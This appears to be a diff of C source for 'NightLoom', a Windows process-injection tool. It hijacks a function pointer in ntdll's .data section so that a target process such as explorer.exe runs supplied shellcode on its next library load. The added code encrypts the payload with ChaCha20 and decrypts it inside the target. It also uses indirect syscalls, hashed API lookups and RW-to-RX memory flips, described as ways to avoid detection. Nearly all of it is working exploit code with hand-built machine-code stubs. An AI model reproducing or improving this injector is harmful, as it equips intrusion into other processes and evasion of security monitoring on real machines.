@@ -1,25 +1,32 @@
 /*
  * NightLoom — Cross-process Injection via Ldr Activation Context Callback
  *
- * NOVEL TECHNIQUE: Overwrites a function pointer stored in ntdll's writable
- * .data section that the Ldr calls through a fothk trampoline (JMP RAX)
- * during every LoadLibrary operation. No CFG validation on the dispatch path.
+ * Overwrites a function pointer stored in ntdll's writable .data section
+ * that the Ldr calls through a fothk trampoline (JMP RAX) during every
+ * LoadLibrary operation. No CFG validation on the dispatch path.
  *
- * Primitives: NtOpenProcess + NtAllocateVirtualMemory + NtWriteVirtualMemory
- * Trigger:    Natural DLL loads in the target (no thread/APC needed)
- * Cleanup:    Shellcode stub auto-restores original pointer before tail-calling
- *
- * All syscalls resolved via Halo's Gate indirect dispatch.
+ * Features:
+ *   - ChaCha20 encrypted payload (decrypted in-target just before exec)
+ *   - RW → RX memory (no RWX pages)
+ *   - Halo's Gate indirect syscalls (7 syscalls, SSN resolved at runtime)
+ *   - CRC32B hash-based API resolution (no plaintext strings)
+ *   - Loader Lock safe (CreateThread dispatch)
+ *   - Self-cleaning stub (restores original pointer)
  */
 
 #include "Common.h"
 #include "HalosGate.h"
 #include "PebResolver.h"
 #include "MemReadGadget.h"
+#include "ChaCha20.h"
 
 #include <TlHelp32.h>
+#include <bcrypt.h>
 
 #pragma comment(lib, "Shlwapi.lib")
+#pragma comment(lib, "bcrypt.lib")
+
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
 typedef struct _CTX_GLOBAL {
     SYSCALL_ENTRY NtOpenProcess;
@@ -32,18 +39,146 @@ typedef struct _CTX_GLOBAL {
 } CTX_GLOBAL, *PCTX_GLOBAL;
 
 typedef struct _CTX_TARGET {
-    DWORD   dwPid;
-    HANDLE  hProcess;
-    PVOID   pSlotRemote;
+    DWORD     dwPid;
+    HANDLE    hProcess;
+    PVOID     pSlotRemote;
     ULONG_PTR ulOrigValue;
-    PVOID   pShellcode;
-    SIZE_T  cbShellcode;
+    PVOID     pRemoteBase;
+    SIZE_T    cbAlloc;
 } CTX_TARGET, *PCTX_TARGET;
 
 static CTX_GLOBAL g_Api = { 0 };
 
-#define STUB_SIZE       0x78
-#define TRAMPOLINE_OFF  0x70
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+// PIC decrypt parameters — passed to DecryptAndRun as lpParameter
+// Layout must match the offsets used by the PIC blob
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+
+typedef struct _DECRYPT_PARAMS {
+    ULONG_PTR pfnVirtualProtect;    // +0x00
+    ULONG_PTR pBase;                // +0x08 (allocation base)
+    SIZE_T    cbAlloc;              // +0x10
+    ULONG_PTR pPayload;            // +0x18
+    DWORD     cbPayload;            // +0x20
+    DWORD     _pad0;                // +0x24
+    ULONG_PTR pTrampoline;         // +0x28
+    BYTE      key[32];              // +0x30
+    BYTE      nonce[12];            // +0x50
+    DWORD     _pad1;                // +0x5C
+} DECRYPT_PARAMS;                   // sizeof = 0x60
+
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+// PIC DecryptAndRun — compiled into .nlpic section, copied to target
+//
+// This function runs in a new thread in the TARGET process.
+// It decrypts the ChaCha20-encrypted payload, flips memory to RX,
+// and calls the payload through an alignment trampoline.
+//
+// CONSTRAINTS (position-independent):
+//   - No global/static data references (all constants as immediates)
+//   - No CRT calls (no memcpy/memset — manual loops)
+//   - No imports (VirtualProtect via function pointer in params)
+//   - __declspec(safebuffers) to suppress stack cookie checks
+// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+
+#pragma code_seg(".nlpic")
+#pragma runtime_checks("", off)
+#pragma optimize("gts", on)
+#pragma strict_gs_check(off)
+
+__declspec(safebuffers) __declspec(noinline)
+static DWORD WINAPI DecryptAndRun(LPVOID lpParam)
+{
+    DECRYPT_PARAMS *p = (DECRYPT_PARAMS *)lpParam;
+
+    typedef BOOL (WINAPI *FN_VP)(LPVOID, SIZE_T, DWORD, PDWORD);
+    FN_VP fnVP = (FN_VP)p->pfnVirtualProtect;
+
+    DWORD oldProt = 0;
+    PBYTE pPayload = (PBYTE)p->pPayload;
+    DWORD cbPayload = p->cbPayload;
+
+    /* RX → RW: make payload writable for decryption */
+    fnVP(pPayload, (SIZE_T)cbPayload, 0x04 /* PAGE_READWRITE */, &oldProt);
+
+    /* ---- ChaCha20 decrypt in-place ---- */
+    {
+        unsigned int state[16], work[16];
+        unsigned int i, j;
+
+        state[ 0] = 0x61707865;
+        state[ 1] = 0x3320646e;
+        state[ 2] = 0x79622d32;
+        state[ 3] = 0x6b206574;
+
+        for (i = 0; i < 8; i++) {
+            unsigned int v = 0;
+            v |= (unsigned int)p->key[i * 4 + 0];
+            v |= (unsigned int)p->key[i * 4 + 1] << 8;
+            v |= (unsigned int)p->key[i * 4 + 2] << 16;
+            v |= (unsigned int)p->key[i * 4 + 3] << 24;
+            state[4 + i] = v;
+        }
+
+        state[12] = 0;
+
+        for (i = 0; i < 3; i++) {
+            unsigned int v = 0;
+            v |= (unsigned int)p->nonce[i * 4 + 0];
+            v |= (unsigned int)p->nonce[i * 4 + 1] << 8;
+            v |= (unsigned int)p->nonce[i * 4 + 2] << 16;
+            v |= (unsigned int)p->nonce[i * 4 + 3] << 24;
+            state[13 + i] = v;
+        }
+
+        DWORD offset = 0;
+        while (offset < cbPayload) {
+            for (i = 0; i < 16; i++) work[i] = state[i];
+
+            for (i = 0; i < 10; i++) {
+                #define ROTL(v, n) (((v) << (n)) | ((v) >> (32 - (n))))
+                #define QR(a, b, c, d) \
+                    work[a]+=work[b]; work[d]^=work[a]; work[d]=ROTL(work[d],16); \
+                    work[c]+=work[d]; work[b]^=work[c]; work[b]=ROTL(work[b],12); \
+                    work[a]+=work[b]; work[d]^=work[a]; work[d]=ROTL(work[d], 8); \
+                    work[c]+=work[d]; work[b]^=work[c]; work[b]=ROTL(work[b], 7);
+
+                QR(0,4,8,12);  QR(1,5,9,13);  QR(2,6,10,14); QR(3,7,11,15);
+                QR(0,5,10,15); QR(1,6,11,12); QR(2,7,8,13);  QR(3,4,9,14);
+
+                #undef QR
+                #undef ROTL
+            }
+
+            for (i = 0; i < 16; i++) work[i] += state[i];
+
+            {
+                unsigned int blen = cbPayload - offset;
+                if (blen > 64) blen = 64;
+                unsigned char *ks = (unsigned char *)work;
+                for (j = 0; j < blen; j++)
+                    pPayload[offset + j] ^= ks[j];
+            }
+
+            state[12]++;
+            offset += 64;
+        }
+    }
+
+    /* RW → RX: make payload executable */
+    fnVP(pPayload, (SIZE_T)cbPayload, 0x20 /* PAGE_EXECUTE_READ */, &oldProt);
+
+    /* Call payload through alignment trampoline */
+    ((DWORD (WINAPI *)(LPVOID))p->pTrampoline)(NULL);
+
+    return 0;
+}
+
+__declspec(noinline) static void DecryptAndRun_End(void) { }
+
+#pragma code_seg()
+#pragma runtime_checks("", restore)
+#pragma optimize("", on)
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 // Phase 0: Initialize Halo's Gate
@@ -107,14 +242,6 @@ static DWORD FindProcessByName(const WCHAR *name)
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 // Phase 1: Locate the activation context pointer in ntdll .data
-//
-// Strategy: Scan ntdll .data for the CreateActCtxW Worker pointer.
-// The Ldr stores kernel32's internal CreateActCtxWWorker address there
-// during process initialization. We find it by:
-// 1. Parse ntdll PE to find .data section
-// 2. Get kernel32 base + size
-// 3. Scan .data offsets 0x6000-0x7000 for pointers into kernel32
-// 4. The target is the last such pointer in the group of 3 actctx ptrs
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
 static PVOID LocateActCtxSlot(OUT ULONG_PTR *pOrigValue)
@@ -148,13 +275,7 @@ static PVOID LocateActCtxSlot(OUT ULONG_PTR *pOrigValue)
     printf("[*] ntdll .data: 0x%p (size 0x%lX)\n", (PVOID)dataVA, dataSize);
     printf("[*] kernel32:    0x%p - 0x%p\n", (PVOID)k32Base, (PVOID)k32End);
 
-    /* Pattern scan: The activation context pointers are a cluster
-     * of kernel32/KERNELBASE function pointers in the Ldr's initialization
-     * data area. We find them by scanning ntdll .text for MOV RAX,[rip+disp]
-     * instructions whose target falls in .data and is followed by a CALL to
-     * a fothk trampoline entry. The fothk section has JMP rel32 → JMP RAX. */
-
-    /* First, find the fothk section */
+    /* fothk pattern scan — fully dynamic, works on any Windows build */
     ULONG_PTR fothkVA = 0;
     DWORD fothkSize = 0;
     for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
@@ -165,7 +286,6 @@ static PVOID LocateActCtxSlot(OUT ULONG_PTR *pOrigValue)
         }
     }
 
-    /* Find the main .text section (largest executable) */
     ULONG_PTR textVA = 0;
     DWORD textSize = 0;
     for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
@@ -183,8 +303,6 @@ static PVOID LocateActCtxSlot(OUT ULONG_PTR *pOrigValue)
 
     printf("[*] Scanning .text for fothk-dispatched .data pointers...\n");
 
-    /* Scan .text for: MOV RAX, [rip+disp32] (48 8B 05 xx xx xx xx)
-     * followed within 32 bytes by CALL rel32 (E8 xx xx xx xx) → fothk */
     for (ULONG_PTR pc = textVA; pc + 12 < textVA + textSize; pc++) {
         PBYTE b = (PBYTE)pc;
         if (b[0] != 0x48 || b[1] != 0x8B || b[2] != 0x05) continue;
@@ -194,30 +312,27 @@ static PVOID LocateActCtxSlot(OUT ULONG_PTR *pOrigValue)
 
         if (dataTarget < dataVA || dataTarget >= dataVA + dataSize) continue;
 
-        /* Check if value at that .data slot is a kernel32 code pointer */
         ULONG_PTR val = *(ULONG_PTR*)dataTarget;
         if (val < k32Base || val >= k32End) continue;
 
-        /* Look ahead for CALL rel32 → fothk within 48 bytes */
         for (int j = 7; j < 48 && pc + j + 5 < textVA + textSize; j++) {
             if (b[j] != 0xE8) continue;
             INT32 callDisp = *(INT32*)(b + j + 1);
             ULONG_PTR callTarget = pc + j + 5 + callDisp;
             if (callTarget >= fothkVA && callTarget < fothkVA + fothkSize) {
                 DWORD dataOff = (DWORD)(dataTarget - dataVA);
-                printf("[+] .data+0x%04lX → kernel32+0x%llX (fothk dispatch at ntdll+0x%llX)\n",
+                printf("[+] .data+0x%04lX -> kernel32+0x%llX (fothk at ntdll+0x%llX)\n",
                        dataOff,
                        (unsigned long long)(val - k32Base),
                        (unsigned long long)(pc - ntBase));
 
-                /* Verify the fothk entry is JMP rel32 → JMP RAX pattern */
                 PBYTE pFothk = (PBYTE)callTarget;
                 if (pFothk[0] == 0xE9) {
                     INT32 jmpDisp = *(INT32*)(pFothk + 1);
                     PBYTE pJmpTarget = pFothk + 5 + jmpDisp;
                     if (pJmpTarget[0] == 0x48 && pJmpTarget[1] == 0xFF &&
                         pJmpTarget[2] == 0xE0) {
-                        printf("[+] Confirmed: fothk → JMP RAX (no CFG)\n");
+                        printf("[+] Confirmed: fothk -> JMP RAX (no CFG)\n");
                         *pOrigValue = val;
                         return (PVOID)dataTarget;
                     }
@@ -282,7 +397,7 @@ static BOOL VerifyRemoteSlot(PCTX_TARGET ctx)
     printf("[+] Remote slot: 0x%p\n", (PVOID)remoteVal);
 
     if (remoteVal != ctx->ulOrigValue) {
-        printf("[!] Remote value differs from local — using remote value\n");
+        printf("[!] Remote value differs from local -- using remote value\n");
         ctx->ulOrigValue = remoteVal;
     }
 
@@ -290,48 +405,82 @@ static BOOL VerifyRemoteSlot(PCTX_TARGET ctx)
 }
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
-// Phase 4: Build shellcode (stub + payload) and inject
+// Phase 4: Build + inject (ChaCha20 encrypted payload)
+//
+// Memory layout in target:
+//   [0x000] Callback stub      — fires under Loader Lock
+//   [0x077] Trampoline         — alignment wrapper for shellcode
+//   [0x088] DECRYPT_PARAMS     — key, nonce, addresses for PIC blob
+//   [0x0E8] DecryptAndRun blob — PIC ChaCha20 decryptor from .nlpic
+//   [blob+] Encrypted payload  — ChaCha20 ciphertext
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+
+#define CALLBACK_STUB_SIZE 0x77
+#define TRAMP_SIZE         15
+#define TRAMP_OFF          0x77
+#define PARAMS_OFF         0x88
 
 static BOOL InjectShellcode(PCTX_TARGET ctx, PBYTE pPayload, DWORD cbPayload)
 {
-    /*
-     * The callback fires while the Ldr lock is held (inside LoadLibrary).
-     * Calling WinExec/CreateProcess directly would deadlock on the Ldr lock.
-     * Solution: spawn a new thread via CreateThread to run the payload
-     * asynchronously, outside the lock context.
-     *
-     * Stub layout (0x70 = 112 bytes):
-     *   [00-0A] Save volatile registers (7 pushes)
-     *   [0B-0E] sub rsp, 0x30 (shadow + 2 stack args, aligned)
-     *   [0F-18] MOV RAX, <slot_addr>
-     *   [19-22] MOV RCX, <orig_value>
-     *   [23-25] MOV [RAX], RCX          ; restore original pointer
-     *   [26-27] XOR ECX, ECX            ; lpSecurityAttributes = NULL
-     *   [28-29] XOR EDX, EDX            ; dwStackSize = 0
-     *   [2A-33] MOV R8, <payload_addr>  ; lpStartAddress
-     *   [34-36] XOR R9D, R9D            ; lpParameter = NULL
-     *   [37-3F] MOV [RSP+0x20], 0       ; dwCreationFlags = 0
-     *   [40-48] MOV [RSP+0x28], 0       ; lpThreadId = NULL
-     *   [49-52] MOV RAX, <CreateThread>
-     *   [53-54] CALL RAX                ; CreateThread → runs payload in new thread
-     *   [55-58] add rsp, 0x30
-     *   [59-63] Restore volatile registers
-     *   [64-6D] MOV RAX, <orig_value>
-     *   [6E-6F] JMP RAX                 ; tail-call original function
-     *   [70]    payload starts here (LPTHREAD_START_ROUTINE compatible)
-     */
-
-    /* Resolve CreateThread via hash — no plaintext strings */
+    /* Resolve APIs via hash */
     HMODULE hK32 = ResolveModuleByHash(CRC32B_KERNEL32DLL);
     FARPROC pCreateThread = ResolveProcByHash(hK32, CRC32B_CREATETHREAD);
-    if (!pCreateThread) {
-        printf("[!] Cannot resolve CreateThread\n");
+    FARPROC pVirtualProtect = ResolveProcByHash(hK32, CRC32B_VIRTUALPROTECT);
+    if (!pCreateThread || !pVirtualProtect) {
+        printf("[!] Cannot resolve CreateThread/VirtualProtect\n");
         return FALSE;
     }
-    printf("[*] CreateThread: 0x%p\n", pCreateThread);
+    printf("[*] CreateThread:    0x%p\n", pCreateThread);
+    printf("[*] VirtualProtect:  0x%p\n", pVirtualProtect);
 
-    BYTE stub[STUB_SIZE] = {
+    /* Get PIC decrypt blob from .nlpic section of our own PE */
+    PVOID pBlobSrc = (PVOID)DecryptAndRun;
+    DWORD cbBlob = (DWORD)((ULONG_PTR)DecryptAndRun_End - (ULONG_PTR)DecryptAndRun);
+    printf("[*] PIC decrypt blob: %lu bytes\n", cbBlob);
+
+    /* Compute layout offsets */
+    DWORD blobOff = PARAMS_OFF + sizeof(DECRYPT_PARAMS);
+    blobOff = (blobOff + 15) & ~15;   /* align to 16 */
+    DWORD payloadOff = blobOff + cbBlob;
+    payloadOff = (payloadOff + 15) & ~15;
+    DWORD cbTotal = payloadOff + cbPayload;
+
+    printf("[*] Layout: stub=0x000 tramp=0x%03X params=0x%03X blob=0x%03X payload=0x%03X total=%lu\n",
+           TRAMP_OFF, PARAMS_OFF, blobOff, payloadOff, cbTotal);
+
+    /* Generate random ChaCha20 key + nonce */
+    BYTE key[32], nonce[12];
+    NTSTATUS bcStatus = BCryptGenRandom(NULL, key, sizeof(key),
+                                         BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+    if (bcStatus != 0) {
+        printf("[!] BCryptGenRandom (key) failed: 0x%08lX\n", bcStatus);
+        return FALSE;
+    }
+    bcStatus = BCryptGenRandom(NULL, nonce, sizeof(nonce),
+                                BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+    if (bcStatus != 0) {
+        printf("[!] BCryptGenRandom (nonce) failed: 0x%08lX\n", bcStatus);
+        return FALSE;
+    }
+    printf("[+] ChaCha20 key/nonce generated (%d + %d bytes)\n",
+           (int)sizeof(key), (int)sizeof(nonce));
+
+    /* Encrypt a copy of the payload */
+    PBYTE pEncPayload = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPayload);
+    if (!pEncPayload) return FALSE;
+    memcpy(pEncPayload, pPayload, cbPayload);
+    ChaCha20_Crypt(pEncPayload, cbPayload, key, nonce, 0);
+    printf("[+] Payload encrypted with ChaCha20\n");
+
+    /* Build the full buffer */
+    PBYTE pBuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbTotal);
+    if (!pBuf) {
+        HeapFree(GetProcessHeap(), 0, pEncPayload);
+        return FALSE;
+    }
+
+    /* ---- Callback stub (fires under Loader Lock) ---- */
+    BYTE callbackStub[CALLBACK_STUB_SIZE] = {
         /* Save volatile registers */
         0x50,                                           /* 00: push rax         */
         0x51,                                           /* 01: push rcx         */
@@ -342,52 +491,55 @@ static BOOL InjectShellcode(PCTX_TARGET ctx, PBYTE pPayload, DWORD cbPayload)
         0x41, 0x53,                                     /* 09: push r11         */
         0x48, 0x83, 0xEC, 0x30,                         /* 0B: sub rsp, 0x30   */
 
-        /* Restore original pointer */
+        /* Restore original .data pointer */
         0x48, 0xB8, 0,0,0,0,0,0,0,0,                   /* 0F: mov rax, <slot>  */
         0x48, 0xB9, 0,0,0,0,0,0,0,0,                   /* 19: mov rcx, <orig>  */
         0x48, 0x89, 0x08,                               /* 23: mov [rax], rcx   */
 
-        /* CreateThread(NULL, 0, payload, NULL, 0, NULL) */
+        /* CreateThread(NULL, 0, DecryptAndRun, pParams, 0, NULL) */
         0x31, 0xC9,                                     /* 26: xor ecx, ecx     */
         0x31, 0xD2,                                     /* 28: xor edx, edx     */
-        0x49, 0xB8, 0,0,0,0,0,0,0,0,                   /* 2A: mov r8, <payload>*/
-        0x45, 0x31, 0xC9,                               /* 34: xor r9d, r9d     */
-        0x48, 0xC7, 0x44, 0x24, 0x20, 0,0,0,0,         /* 37: mov [rsp+20],0   */
-        0x48, 0xC7, 0x44, 0x24, 0x28, 0,0,0,0,         /* 40: mov [rsp+28],0   */
-        0x48, 0xB8, 0,0,0,0,0,0,0,0,                   /* 49: mov rax, <CT>    */
-        0xFF, 0xD0,                                     /* 53: call rax         */
+        0x49, 0xB8, 0,0,0,0,0,0,0,0,                   /* 2A: mov r8, <blob>   */
+        0x49, 0xB9, 0,0,0,0,0,0,0,0,                   /* 34: mov r9, <params> */
+        0x48, 0xC7, 0x44, 0x24, 0x20, 0,0,0,0,         /* 3E: [rsp+20] = 0    */
+        0x48, 0xC7, 0x44, 0x24, 0x28, 0,0,0,0,         /* 47: [rsp+28] = 0    */
+        0x48, 0xB8, 0,0,0,0,0,0,0,0,                   /* 50: mov rax, <CT>   */
+        0xFF, 0xD0,                                     /* 5A: call rax         */
 
         /* Restore registers */
-        0x48, 0x83, 0xC4, 0x30,                         /* 55: add rsp, 0x30   */
-        0x41, 0x5B,                                     /* 59: pop r11          */
-        0x41, 0x5A,                                     /* 5B: pop r10          */
-        0x41, 0x59,                                     /* 5D: pop r9           */
-        0x41, 0x58,                                     /* 5F: pop r8           */
-        0x5A,                                           /* 61: pop rdx          */
-        0x59,                                           /* 62: pop rcx          */
-        0x58,                                           /* 63: pop rax          */
+        0x48, 0x83, 0xC4, 0x30,                         /* 5C: add rsp, 0x30   */
+        0x41, 0x5B,                                     /* 60: pop r11          */
+        0x41, 0x5A,                                     /* 62: pop r10          */
+        0x41, 0x59,                                     /* 64: pop r9           */
+        0x41, 0x58,                                     /* 66: pop r8           */
+        0x5A,                                           /* 68: pop rdx          */
+        0x59,                                           /* 69: pop rcx          */
+        0x58,                                           /* 6A: pop rax          */
 
-        /* Tail-call to original function */
-        0x48, 0xB8, 0,0,0,0,0,0,0,0,                   /* 64: mov rax, <orig>  */
-        0xFF, 0xE0,                                     /* 6E: jmp rax          */
-
-        /* Trampoline for LPTHREAD_START_ROUTINE alignment.
-         * CreateThread → BaseThreadInitThunk → CALL trampoline (RSP = 16n-8).
-         * Shellcode expects RSP = 16n-16 (designed for direct CALL entry).
-         * This CALL adds the missing 8 bytes of stack depth. */
-        0xE8, 0x03, 0x00, 0x00, 0x00,                  /* 70: call +3 → 0x78   */
-        0x31, 0xC0,                                     /* 75: xor eax, eax     */
-        0xC3,                                           /* 77: ret              */
+        /* Tail-call original function */
+        0x48, 0xB8, 0,0,0,0,0,0,0,0,                   /* 6B: mov rax, <orig>  */
+        0xFF, 0xE0,                                     /* 75: jmp rax          */
     };
 
-    DWORD cbTotal = STUB_SIZE + cbPayload;
-    PBYTE pBuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbTotal);
-    if (!pBuf) return FALSE;
+    memcpy(pBuf, callbackStub, CALLBACK_STUB_SIZE);
 
-    memcpy(pBuf, stub, STUB_SIZE);
-    memcpy(pBuf + STUB_SIZE, pPayload, cbPayload);
+    /* ---- Alignment trampoline ---- */
+    BYTE trampoline[TRAMP_SIZE] = {
+        0x48, 0xB8, 0,0,0,0,0,0,0,0,                   /* mov rax, <payload>   */
+        0xFF, 0xD0,                                     /* call rax             */
+        0x31, 0xC0,                                     /* xor eax, eax         */
+        0xC3,                                           /* ret                  */
+    };
+    memcpy(pBuf + TRAMP_OFF, trampoline, TRAMP_SIZE);
 
-    /* Allocate RW in target (NOT RWX — flip to RX after writing) */
+    /* ---- DecryptAndRun PIC blob ---- */
+    memcpy(pBuf + blobOff, pBlobSrc, cbBlob);
+
+    /* ---- Encrypted payload ---- */
+    memcpy(pBuf + payloadOff, pEncPayload, cbPayload);
+    HeapFree(GetProcessHeap(), 0, pEncPayload);
+
+    /* ---- Allocate RW in target ---- */
     PVOID pRemote = NULL;
     SIZE_T cbAlloc = (SIZE_T)cbTotal;
 
@@ -406,14 +558,31 @@ static BOOL InjectShellcode(PCTX_TARGET ctx, PBYTE pPayload, DWORD cbPayload)
 
     printf("[+] Allocated RW: 0x%p (%llu bytes)\n", pRemote, (unsigned long long)cbAlloc);
 
-    /* Patch stub with actual addresses */
-    *(ULONG_PTR*)(pBuf + 0x11) = (ULONG_PTR)ctx->pSlotRemote;     /* slot addr  */
-    *(ULONG_PTR*)(pBuf + 0x1B) = ctx->ulOrigValue;                 /* orig value */
-    *(ULONG_PTR*)(pBuf + 0x2C) = (ULONG_PTR)pRemote + TRAMPOLINE_OFF; /* trampoline */
-    *(ULONG_PTR*)(pBuf + 0x4B) = (ULONG_PTR)pCreateThread;        /* CreateThread */
-    *(ULONG_PTR*)(pBuf + 0x66) = ctx->ulOrigValue;                 /* orig (jmp) */
+    /* ---- Patch addresses (now that we know pRemote) ---- */
 
-    /* Write to target */
+    /* Callback stub patches */
+    *(ULONG_PTR*)(pBuf + 0x11) = (ULONG_PTR)ctx->pSlotRemote;
+    *(ULONG_PTR*)(pBuf + 0x1B) = ctx->ulOrigValue;
+    *(ULONG_PTR*)(pBuf + 0x2C) = (ULONG_PTR)pRemote + blobOff;    /* DecryptAndRun */
+    *(ULONG_PTR*)(pBuf + 0x36) = (ULONG_PTR)pRemote + PARAMS_OFF; /* params */
+    *(ULONG_PTR*)(pBuf + 0x52) = (ULONG_PTR)pCreateThread;
+    *(ULONG_PTR*)(pBuf + 0x6D) = ctx->ulOrigValue;
+
+    /* Trampoline: patch payload address */
+    *(ULONG_PTR*)(pBuf + TRAMP_OFF + 2) = (ULONG_PTR)pRemote + payloadOff;
+
+    /* DECRYPT_PARAMS struct */
+    DECRYPT_PARAMS *pParams = (DECRYPT_PARAMS *)(pBuf + PARAMS_OFF);
+    pParams->pfnVirtualProtect = (ULONG_PTR)pVirtualProtect;
+    pParams->pBase = (ULONG_PTR)pRemote;
+    pParams->cbAlloc = cbAlloc;
+    pParams->pPayload = (ULONG_PTR)pRemote + payloadOff;
+    pParams->cbPayload = cbPayload;
+    pParams->pTrampoline = (ULONG_PTR)pRemote + TRAMP_OFF;
+    memcpy(pParams->key, key, 32);
+    memcpy(pParams->nonce, nonce, 12);
+
+    /* ---- Write to target ---- */
     SIZE_T cbWritten = 0;
     GATE_PREPARE(g_Api.NtWriteVirtualMemory);
     status = GATE_CALL(
@@ -424,14 +593,14 @@ static BOOL InjectShellcode(PCTX_TARGET ctx, PBYTE pPayload, DWORD cbPayload)
     HeapFree(GetProcessHeap(), 0, pBuf);
 
     if (!NT_SUCCESS(status)) {
-        printf("[!] NtWriteVirtualMemory (shellcode) failed: 0x%08lX\n", status);
+        printf("[!] NtWriteVirtualMemory failed: 0x%08lX\n", status);
         return FALSE;
     }
 
-    printf("[+] Written %llu bytes (stub: %d + payload: %lu)\n",
-           (unsigned long long)cbWritten, STUB_SIZE, cbPayload);
+    printf("[+] Written %llu bytes (stub + tramp + params + blob + encrypted payload)\n",
+           (unsigned long long)cbWritten);
 
-    /* Flip RW → RX (removes biggest detection signal) */
+    /* ---- Flip RW -> RX ---- */
     {
         PVOID pProtect = pRemote;
         SIZE_T cbProtect = cbAlloc;
@@ -444,29 +613,34 @@ static BOOL InjectShellcode(PCTX_TARGET ctx, PBYTE pPayload, DWORD cbPayload)
         );
 
         if (!NT_SUCCESS(status)) {
-            printf("[!] NtProtectVirtualMemory (RW→RX) failed: 0x%08lX\n", status);
+            printf("[!] NtProtectVirtualMemory (RW->RX) failed: 0x%08lX\n", status);
             return FALSE;
         }
 
-        printf("[+] Protection: RW → RX\n");
+        printf("[+] Protection: RW -> RX\n");
     }
 
-    ctx->pShellcode = pRemote;
-    ctx->cbShellcode = cbTotal;
+    ctx->pRemoteBase = pRemote;
+    ctx->cbAlloc = cbAlloc;
+
+    /* Zero key material from injector memory */
+    SecureZeroMemory(key, sizeof(key));
+    SecureZeroMemory(nonce, sizeof(nonce));
+
     return TRUE;
 }
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
-// Phase 5: Overwrite the .data pointer → arm the trigger
+// Phase 5: Overwrite the .data pointer -> arm the trigger
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
 static BOOL ArmTrigger(PCTX_TARGET ctx)
 {
-    ULONG_PTR newVal = (ULONG_PTR)ctx->pShellcode;
+    ULONG_PTR newVal = (ULONG_PTR)ctx->pRemoteBase;
     SIZE_T cbWritten = 0;
 
     printf("[*] Overwriting .data pointer:\n");
-    printf("    0x%p → 0x%p\n", (PVOID)ctx->ulOrigValue, (PVOID)newVal);
+    printf("    0x%p -> 0x%p\n", (PVOID)ctx->ulOrigValue, (PVOID)newVal);
 
     GATE_PREPARE(g_Api.NtWriteVirtualMemory);
     NTSTATUS status = GATE_CALL(
@@ -479,7 +653,7 @@ static BOOL ArmTrigger(PCTX_TARGET ctx)
         return FALSE;
     }
 
-    printf("[+] Pointer overwritten — trigger armed\n");
+    printf("[+] Pointer overwritten -- trigger armed\n");
     return TRUE;
 }
 
@@ -493,14 +667,15 @@ int wmain(int argc, WCHAR **argv)
     g_bVerbose = TRUE;
 
     printf("\n");
-    printf("  ╔══════════════════════════════════════════════════════════╗\n");
-    printf("  ║  GhostCtx — Ldr Activation Context Callback Injection  ║\n");
-    printf("  ║  Novel technique: .data fptr → fothk JMP RAX (no CFG)  ║\n");
-    printf("  ╚══════════════════════════════════════════════════════════╝\n");
+    printf("  +------------------------------------------------------------+\n");
+    printf("  |  NightLoom                                                 |\n");
+    printf("  |  Ldr Activation Context Callback Injection                 |\n");
+    printf("  |  .data fptr -> fothk JMP RAX (no CFG) | ChaCha20 payload  |\n");
+    printf("  +------------------------------------------------------------+\n");
     printf("\n");
 
     if (argc < 2) {
-        printf("  Usage: GhostCtx.exe <shellcode.bin> [target]\n");
+        printf("  Usage: NightLoom.exe <shellcode.bin> [target]\n");
         printf("         target = PID (numeric) or process name\n");
         printf("         default target: explorer.exe\n\n");
         return 1;
@@ -539,11 +714,11 @@ int wmain(int argc, WCHAR **argv)
     }
     printf("[+] Target PID: %lu\n\n", ctx.dwPid);
 
-    /* Phase 0: Initialize indirect syscalls */
+    /* Phase 0 */
     printf("[*] Phase 0: Initializing Halo's Gate...\n");
     if (!InitializeGate()) return 1;
 
-    /* Phase 1: Locate the target pointer in ntdll .data */
+    /* Phase 1 */
     printf("\n[*] Phase 1: Locating activation context callback slot...\n");
     PVOID pSlot = LocateActCtxSlot(&ctx.ulOrigValue);
     if (!pSlot) {
@@ -552,19 +727,19 @@ int wmain(int argc, WCHAR **argv)
     }
     ctx.pSlotRemote = pSlot;
 
-    /* Phase 2: Open target */
+    /* Phase 2 */
     printf("\n[*] Phase 2: Opening target process...\n");
     if (!OpenTarget(&ctx)) return 1;
 
-    /* Phase 3: Verify remote slot */
+    /* Phase 3 */
     printf("\n[*] Phase 3: Verifying remote pointer...\n");
     if (!VerifyRemoteSlot(&ctx)) return 1;
 
-    /* Phase 4: Inject shellcode */
-    printf("\n[*] Phase 4: Injecting shellcode...\n");
+    /* Phase 4 */
+    printf("\n[*] Phase 4: Injecting (ChaCha20 encrypted)...\n");
     if (!InjectShellcode(&ctx, pPayload, cbPayload)) return 1;
 
-    /* Phase 5: Arm trigger */
+    /* Phase 5 */
     printf("\n[*] Phase 5: Arming trigger...\n");
     if (!ArmTrigger(&ctx)) return 1;
 
@@ -576,8 +751,9 @@ int wmain(int argc, WCHAR **argv)
 
     printf("\n[+] Injection complete!\n");
     printf("[*] Trigger: next LoadLibrary call in PID %lu\n", ctx.dwPid);
